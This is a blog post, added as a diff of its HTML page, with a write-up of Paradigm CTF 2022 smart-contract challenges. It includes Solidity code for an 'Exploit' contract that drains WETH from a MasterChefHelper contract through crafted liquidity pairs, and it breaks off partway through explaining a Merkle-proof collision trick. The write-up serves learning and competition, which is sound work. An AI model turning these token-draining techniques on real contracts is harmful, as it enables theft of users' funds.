@@ -1,0 +1,323 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="My Paradigm CTF 2022 write-ups" /><meta property="og:locale" content="en" /><meta name="description" content="Paradigm CTF ? Paradigm hosted a CTF this year named Paradigm CTF 2022. It is an online competition organized for blockchain devs, smart contract devs &amp; hackers. It was also conducted last year in 2021. This year there were total of 23 challenges &amp; this time around multiple different platforms were a part of this CTF. Including EVM-based, Non-EVM i.e Cairo &amp; solana. There were also multiple difficulty level challenges &amp; some follow-up challneges which depended on solving some other challenges." /><meta property="og:description" content="Paradigm CTF ? Paradigm hosted a CTF this year named Paradigm CTF 2022. It is an online competition organized for blockchain devs, smart contract devs &amp; hackers. It was also conducted last year in 2021. This year there were total of 23 challenges &amp; this time around multiple different platforms were a part of this CTF. Including EVM-based, Non-EVM i.e Cairo &amp; solana. There were also multiple difficulty level challenges &amp; some follow-up challneges which depended on solving some other challenges." /><link rel="canonical" href="https://abdulsamijay.github.io/posts/my-paradigm-ctf-2022-write-up/" /><meta property="og:url" content="https://abdulsamijay.github.io/posts/my-paradigm-ctf-2022-write-up/" /><meta property="og:site_name" content="ASJ Blogs" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-28T10:00:00+05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="My Paradigm CTF 2022 write-ups" /><meta name="twitter:site" content="@abdulsamijay" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-20T22:30:09+05:00","datePublished":"2022-08-28T10:00:00+05:00","description":"Paradigm CTF ? Paradigm hosted a CTF this year named Paradigm CTF 2022. It is an online competition organized for blockchain devs, smart contract devs &amp; hackers. It was also conducted last year in 2021. This year there were total of 23 challenges &amp; this time around multiple different platforms were a part of this CTF. Including EVM-based, Non-EVM i.e Cairo &amp; solana. There were also multiple difficulty level challenges &amp; some follow-up challneges which depended on solving some other challenges.","headline":"My Paradigm CTF 2022 write-ups","mainEntityOfPage":{"@type":"WebPage","@id":"https://abdulsamijay.github.io/posts/my-paradigm-ctf-2022-write-up/"},"url":"https://abdulsamijay.github.io/posts/my-paradigm-ctf-2022-write-up/"}</script><title>My Paradigm CTF 2022 write-ups | ASJ Blogs</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="ASJ Blogs"><meta name="application-name" content="ASJ Blogs"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/images/wordle.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">ASJ Blogs</a></div><div class="site-subtitle font-italic">Blogs focused on blockhain & security</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/abdulsamijay" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/abdulsamijay" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','example.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>My Paradigm CTF 2022 write-ups</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>My Paradigm CTF 2022 write-ups</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1661662800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Aug 28, 2022 </em> </span> <span> Updated <em class="" data-ts="1663695009" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 20, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/abdulsamijay">Abdul Sami J.</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1625 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><h3 id="paradigm-ctf-"><span class="mr-2">Paradigm CTF ?</span><a href="#paradigm-ctf-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Paradigm hosted a CTF this year named Paradigm CTF 2022. It is an online competition organized for blockchain devs, smart contract devs &amp; hackers. It was also conducted last year in 2021. This year there were total of 23 challenges &amp; this time around multiple different platforms were a part of this CTF. Including EVM-based, Non-EVM i.e Cairo &amp; solana. There were also multiple difficulty level challenges &amp; some follow-up challneges which depended on solving some other challenges.</p><h3 id="my-journey"><span class="mr-2">My Journey</span><a href="#my-journey" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>I along with my team managed to take down several challaenges that I will explain here. I focused more on the EVM based challenges as I was more familair with solidity &amp; completely ignored non-evm challenges. But, It was brought to my attention that few challenges were <code class="language-plaintext highlighter-rouge">sanity checks</code> meaning they were very very basic challenges we could have crunched in more challenge points for solving them. Sadly by that time the CTF was over! <br /></p><h3 id="challenge-1-random"><span class="mr-2">Challenge 1: Random</span><a href="#challenge-1-random" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This was a very simple challenge in which we had to call the the functio solve with a random value number generated by the contract. By simply inspecting the contract we could deduce the number was 4. It helped getting more comfortable with the challenge submission process.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="mf">0.8</span><span class="p">.</span><span class="mi">15</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Random</span> <span class="p">{</span>
+
+    <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">solved</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+
+    <span class="kd">function</span> <span class="nx">_getRandomNumber</span><span class="p">()</span> <span class="nx">internal</span> <span class="nx">pure</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint256</span><span class="p">)</span> <span class="p">{</span>   <span class="c1">// chosen by fair dice roll.</span>
+        <span class="k">return</span> <span class="mi">4</span><span class="p">;</span>                                                   <span class="c1">// guaranteed to be random.</span>
+    <span class="p">}</span>
+    
+    <span class="kd">function</span> <span class="nx">solve</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">guess</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="nx">guess</span> <span class="o">==</span> <span class="nx">_getRandomNumber</span><span class="p">());</span>
+        <span class="nx">solved</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></table></code></div></div><h3 id="challenge-2-rescue"><span class="mr-2">Challenge 2: Rescue</span><a href="#challenge-2-rescue" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><blockquote><p>I accidentally sent some WETH to a contract, can you help me?</p></blockquote><p>Rescue was more of a financial exploit rather than a reverse engineering or logical-error challenge. Some WETH has been sent to the contract &amp; we somehow need to recover them. The challnge is solved if the WETH balanceOf contract is 0.</p><p>In this challenge, we were provided with the following contracts.</p><ol><li><code class="language-plaintext highlighter-rouge">MasterChefHelper.sol</code> which handles the operations such as adding liquidity &amp; swapping tokens.<li><code class="language-plaintext highlighter-rouge">UniswapV2Like.sol</code> which has the helper interface to interact with the DEX.</ol><p>There are many different ways to solve this challnege here is the strategy we used.</p><ol><li>Create a new token <code class="language-plaintext highlighter-rouge">XYZ</code>.<li>Buy 10 ether worth of Sushi &amp; send it to <code class="language-plaintext highlighter-rouge">MasterChefHelper</code>.<li>Create a new pair of XYZ &amp; Sushi. This is needed as the <code class="language-plaintext highlighter-rouge">swapTokenForPoolToken</code> function requires two token addresses.<li>Then we call the function <code class="language-plaintext highlighter-rouge">swapTokenForPoolToken</code> it internally calls <code class="language-plaintext highlighter-rouge">add_liquidity</code> which takes the tokens i.e SUSHI &amp; XYZ in <code class="language-plaintext highlighter-rouge">MasterChefHelper</code> &amp; adds the liquidity. It also mints the liquidity tokens which we can burn to get the assets for ourselves.<li>The main objective of removing WETH from the contract is acheived.<div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+</pre><td class="rouge-code"><pre><span class="nx">contract</span> <span class="nx">Exploit</span> <span class="p">{</span>
+ <span class="nx">WETH9</span> <span class="kr">public</span> <span class="nx">constant</span> <span class="nx">weth</span> <span class="o">=</span>
+     <span class="nx">WETH9</span><span class="p">(</span><span class="mh">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span><span class="p">);</span>
+ <span class="nx">UniswapV2RouterLike</span> <span class="kr">public</span> <span class="nx">constant</span> <span class="nx">router</span> <span class="o">=</span>
+     <span class="nx">UniswapV2RouterLike</span><span class="p">(</span><span class="mh">0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F</span><span class="p">);</span>
+ <span class="nx">Token</span> <span class="kr">public</span> <span class="nx">xyz</span><span class="p">;</span>
+ <span class="nx">address</span> <span class="nx">sushi</span> <span class="o">=</span> <span class="mh">0x6B3595068778DD592e39A122f4f5a5cF09C90fE2</span><span class="p">;</span>
+ <span class="nx">MasterChefHelper</span> <span class="nx">mcHelper</span><span class="p">;</span>
+
+ <span class="kd">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_helper</span><span class="p">)</span> <span class="p">{</span>
+     <span class="nx">xyz</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Token</span><span class="p">();</span>
+     <span class="nx">mcHelper</span> <span class="o">=</span> <span class="nx">MasterChefHelper</span><span class="p">(</span><span class="nx">_helper</span><span class="p">);</span>
+     <span class="nx">ERC20Like</span><span class="p">(</span><span class="nx">sushi</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">router</span><span class="p">),</span> <span class="nx">type</span><span class="p">(</span><span class="nx">uint256</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
+     <span class="nx">ERC20Like</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">weth</span><span class="p">)).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">router</span><span class="p">),</span> <span class="nx">type</span><span class="p">(</span><span class="nx">uint256</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
+     <span class="nx">ERC20Like</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">xyz</span><span class="p">)).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">router</span><span class="p">),</span> <span class="nx">type</span><span class="p">(</span><span class="nx">uint256</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
+ <span class="p">}</span>
+
+ <span class="kd">function</span> <span class="nx">getSushi</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">amountIn</span><span class="p">)</span> <span class="nx">external</span> <span class="p">{</span>
+     <span class="nx">address</span><span class="p">[]</span> <span class="nx">memory</span> <span class="nx">path</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">address</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
+     <span class="nx">path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">address</span><span class="p">(</span><span class="nx">weth</span><span class="p">);</span>
+     <span class="nx">path</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">sushi</span><span class="p">;</span> <span class="c1">//sushi</span>
+     <span class="nx">router</span><span class="p">.</span><span class="nx">swapExactTokensForTokens</span><span class="p">(</span>
+         <span class="nx">amountIn</span><span class="p">,</span>
+         <span class="mi">0</span><span class="p">,</span>
+         <span class="nx">path</span><span class="p">,</span>
+         <span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span>
+         <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span>
+     <span class="p">);</span>
+ <span class="p">}</span>
+
+ <span class="kd">function</span> <span class="nx">createPairWithSushi</span><span class="p">()</span> <span class="nx">external</span> <span class="p">{</span>
+     <span class="nx">router</span><span class="p">.</span><span class="nx">addLiquidity</span><span class="p">(</span>
+         <span class="nx">address</span><span class="p">(</span><span class="nx">xyz</span><span class="p">),</span>
+         <span class="nx">address</span><span class="p">(</span><span class="nx">weth</span><span class="p">),</span>
+         <span class="mi">10000</span> <span class="nx">ether</span><span class="p">,</span>
+         <span class="mi">1</span> <span class="nx">ether</span><span class="p">,</span>
+         <span class="mi">99</span> <span class="nx">ether</span><span class="p">,</span>
+         <span class="mf">0.5</span> <span class="nx">ether</span><span class="p">,</span>
+         <span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span>
+         <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span>
+     <span class="p">);</span>
+
+     <span class="nx">router</span><span class="p">.</span><span class="nx">addLiquidity</span><span class="p">(</span>
+         <span class="nx">address</span><span class="p">(</span><span class="nx">xyz</span><span class="p">),</span>
+         <span class="nx">sushi</span><span class="p">,</span>
+         <span class="mi">10000</span> <span class="nx">ether</span><span class="p">,</span>
+         <span class="mi">1</span> <span class="nx">ether</span><span class="p">,</span>
+         <span class="mi">99</span> <span class="nx">ether</span><span class="p">,</span>
+         <span class="mf">0.5</span> <span class="nx">ether</span><span class="p">,</span>
+         <span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span>
+         <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span>
+     <span class="p">);</span>
+     <span class="c1">// the pair of the pool that got created</span>
+ <span class="p">}</span>
+
+ <span class="kd">function</span> <span class="nx">getWeth</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
+     <span class="nx">weth</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">}();</span>
+     <span class="c1">// Now the contract has weth</span>
+ <span class="p">}</span>
+
+ <span class="kd">function</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_addr</span><span class="p">)</span> <span class="nx">external</span> <span class="p">{</span>
+     <span class="nx">ERC20Like</span><span class="p">(</span><span class="nx">sushi</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span>
+         <span class="nx">_addr</span><span class="p">,</span>
+         <span class="nx">ERC20Like</span><span class="p">(</span><span class="nx">sushi</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span>
+     <span class="p">);</span>
+     <span class="nx">mcHelper</span><span class="p">.</span><span class="nx">swapTokenForPoolToken</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="nx">address</span><span class="p">(</span><span class="nx">xyz</span><span class="p">),</span> <span class="mf">0.0000001</span> <span class="nx">ether</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+ <span class="p">}</span>
+
+ <span class="nx">receive</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{}</span>
+<span class="p">}</span>
+</pre></table></code></div></div></ol><h3 id="challenge-3-merkledrop"><span class="mr-2">Challenge 3: Merkledrop</span><a href="#challenge-3-merkledrop" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><blockquote><p>Were you whitelisted? In this challenge, we are presented with the following contracts &amp; files.</p><ol><li><code class="language-plaintext highlighter-rouge">MerkleDistributor.sol</code> which has a <code class="language-plaintext highlighter-rouge">claim</code> function that is responsible for claiming of tokens for addresses that are whitelisted.<li><code class="language-plaintext highlighter-rouge">MerkleProof.sol</code> that handles the logic for verifying proofs.<li><code class="language-plaintext highlighter-rouge">tree.json</code> file that contains proofs for indexes.</ol></blockquote><p>Taking a quick look at <code class="language-plaintext highlighter-rouge">Setup.sol</code> file gave us the following conditions to fulfill in order to complete the challenge.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">isSolved</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">bool</span> <span class="nx">condition1</span> <span class="o">=</span> <span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">merkleDistributor</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="nx">bool</span> <span class="nx">condition2</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nx">uint256</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">64</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">merkleDistributor</span><span class="p">.</span><span class="nx">isClaimed</span><span class="p">(</span><span class="nx">i</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nx">condition2</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">condition1</span> <span class="o">&amp;&amp;</span> <span class="nx">condition2</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></table></code></div></div><ol><li>All of the tokens must be claimed 75,000 * 1e18.<li>Atleast one of the leaf must not be claimed! which seems impossible to do. But is it ?</ol><p>Okay, A few basics on this one as I spent half my day figuring out was exactly wrong!</p><blockquote class="prompt-tip"><div><p>Merkle Tree is a data structure that has at most 2 nodes for each parent. Both of the nodes are hashed together to form the hash of the parent. This continues untill only one root is left called the merkleRoot. This is mostly used for airdropping token to users that are whitelisted.</p><ol><li>Each whitelisted entry would be a node with hash with amcount &amp; it’s corresponding amount for claiming.<li>The proof for every user is generated &amp; provided while claiming the tokens through the contract.<li>This is an efficient technique as users pay gas for claiming &amp; the underlying project does not manually have to airdrop to millions of users in multiple batch transactions!</ol></div></blockquote><p>So basically, the <code class="language-plaintext highlighter-rouge">tree.json</code> file that has been provided to us is collection of users addresses &amp; their proof so it can be verified in the merkleRoot. okay, how do we solve it ?</p><p>In <code class="language-plaintext highlighter-rouge">MerkleDistributor.sol</code> contract we can see the claim function that is very identical to normal merkleDistributor contracts. But if we look close enough we find this nifty detail.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">claim</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">index</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">account</span><span class="p">,</span> <span class="nx">uint96</span> <span class="nx">amount</span><span class="p">,</span> <span class="nx">bytes32</span><span class="p">[]</span> <span class="nx">memory</span> <span class="nx">merkleProof</span><span class="p">)</span> <span class="nx">external</span> <span class="p">{</span>
+        <span class="c1">// ---- snip ----</span>
+
+        <span class="c1">// Verify the merkle proof.</span>
+        <span class="nx">bytes32</span> <span class="nx">node</span> <span class="o">=</span> <span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">index</span><span class="p">,</span> <span class="nx">account</span><span class="p">,</span> <span class="nx">amount</span><span class="p">));</span>
+
+        <span class="c1">// ---- snip ----</span>
+    <span class="p">}</span>
+</pre></table></code></div></div><p>We notice two things,</p><ol><li>The function signature has the <code class="language-plaintext highlighter-rouge">amount</code> of type <code class="language-plaintext highlighter-rouge">uint96</code> instead of <code class="language-plaintext highlighter-rouge">uint256</code>.<li>The node which is of type <code class="language-plaintext highlighter-rouge">bytes32</code> which is <code class="language-plaintext highlighter-rouge">kecack256 hash</code> of <code class="language-plaintext highlighter-rouge">index</code>, <code class="language-plaintext highlighter-rouge">account</code> &amp; <code class="language-plaintext highlighter-rouge">amount</code>.</ol><p>We can try to list all <code class="language-plaintext highlighter-rouge">abi.encodePacked(...)</code> of the claiming accounts &amp; re-construct the <code class="language-plaintext highlighter-rouge">node</code> for every entry this gives is the following format</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="c"># index(32-bytes)-account(address)-amount(uint96)</span>
+<span class="c"># The max value for uint96 = 0xffffffffffffffffffffffff</span>
+<span class="c"># Since any amount will be less than (2 ** 96 - 1) the method will padd extra zeros to fill in space for uint96 as below (The number I use is 120e18):</span>
+0x0000000000000000000000000000000000000000000000000000000000000001-0x374aeA8F8Cd3aDD133EF378A9dD6FC74878E8975-000000-410d586a20a4c00000
+</pre></table></code></div></div><p>We have extra zeros, so what you may ask ? You may have looked at the <code class="language-plaintext highlighter-rouge">tree.json</code> file. There is one entry in the proofs array which has exactly the same pattern. That is index <code class="language-plaintext highlighter-rouge">37</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>0xd48451c19959e2d9bd4e620fbe88aa5f6f7ea72a00000f40f0c122ae08d2207b
+</pre></table></code></div></div><p>What can we assume from this ? A proof entry might be a valid hash in the merkleRoot ? Let’s analyze. The last 12-bytes i.e <code class="language-plaintext highlighter-rouge">00000f40f0c122ae08d2207b</code> is <code class="language-plaintext highlighter-rouge">72033.437049132565012603</code> tokens. Less than 75,000. That’s fishy! Also if we deduct the amount from 75,000 it is <code class="language-plaintext highlighter-rouge">2966.562950867</code>.</p><p>If our theory is correct there should be some combination of amounts that we can use that could be added up or simply be <code class="language-plaintext highlighter-rouge">2699.56</code>. I took first 10 entries &amp; calculated the amount in decimals.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
